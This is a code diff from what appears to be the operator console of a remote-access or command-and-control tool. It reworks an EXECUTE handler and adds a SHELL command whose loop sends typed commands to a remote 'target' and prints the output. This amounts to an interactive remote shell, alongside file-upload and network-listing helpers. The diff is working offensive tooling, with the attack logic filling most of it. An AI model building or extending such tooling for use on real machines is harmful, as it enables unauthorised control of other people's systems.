@@ -116,13 +116,24 @@ namespace TerminalServer
                         expectReturn = true;
                         break;
                     case "EXECUTE":
-                        ExecuteCommand(commandString[1], r);
-                        expectReturn = true;
+                        if (ExecuteCommand(commandString, r) == 1)
+                            expectReturn = true;
+                        else
+                            expectReturn = false;
                         break;
                     case "execute":
-                        Console.WriteLine("Execute command");
-                        ExecuteCommand(commandString[1], r);
-                        expectReturn = true;
+                        if (ExecuteCommand(commandString, r) == 1)
+                            expectReturn = true;
+                        else
+                            expectReturn = false;
+                        break;
+                    case "SHELL":
+                        ExecuteShell(r);
+                        expectReturn = false;
+                        break;
+                    case "shell":
+                        ExecuteShell(r);
+                        expectReturn = false;
                         break;
                     case "UPLOAD":
                         UploadFile(commandString[1], r);
@@ -420,14 +431,49 @@ namespace TerminalServer
             }
             return path;
         }
-
-        private void ExecuteCommand(string command, Random r)
+        /// <summary>
+        /// Helper function to execute a terminal command on the target
+        /// </summary>
+        /// <param name="command">Command string to execute</param>
+        /// <param name="r">Random object to create a session id</param>
+        private int ExecuteCommand(string[] commandString, Random r)
         {
-            Console.WriteLine("[*] the command is: {0}", command);
-            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(command));
-            CommHeader executeHeader = CreateHeader(CommChannel.EXECUTE, compression, CommChannel.COMMAND, r.Next(), bytes.Length);
-            channel.SendHeader(executeHeader);
-            channel.SendBytes(bytes);
+            int success = 0;
+            if (commandString.Length > 1)
+            {
+                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(commandString[1]));
+                CommHeader executeHeader = CreateHeader(CommChannel.EXECUTE, compression, CommChannel.COMMAND, r.Next(), bytes.Length);
+                channel.SendHeader(executeHeader);
+                channel.SendBytes(bytes);
+                success = 1;
+            }
+            return success;
+        }
+        /// <summary>
+        /// Helper function to facilitate executing and interacting with a shell on the target
+        /// </summary>
+        /// <param name="r">Random object to create a session id</param>
+        private void ExecuteShell(Random r)
+        {
+            bool run = true;
+            CommHeader shellHeader = CreateHeader(CommChannel.SHELL, compression, CommChannel.COMMAND, r.Next(), 0);
+            channel.SendHeader(shellHeader);
+            while (run)
+            {
+                // Read input
+                CommHeader response = channel.ReceiveHeader();
+                byte[] bytes = channel.Decompress(channel.ReceiveBytes(response.DataLength));
+                string output = Encoding.UTF8.GetString(bytes);
+                Console.WriteLine(output);
+                // Wait for user commands then send
+                string input = Console.ReadLine();
+                byte[] command = Encoding.UTF8.GetBytes(input);
+                CommHeader commandHeader = CreateHeader(CommChannel.SHELL, compression, CommChannel.RESPONSE, r.Next(), command.Length);
+                channel.SendHeader(commandHeader);
+                channel.SendBytes(channel.Compress(command));
+                if (input.Equals("exit"))
+                    run = false;
+            }
         }
         /// <summary>
         /// Helper function to get the network connections
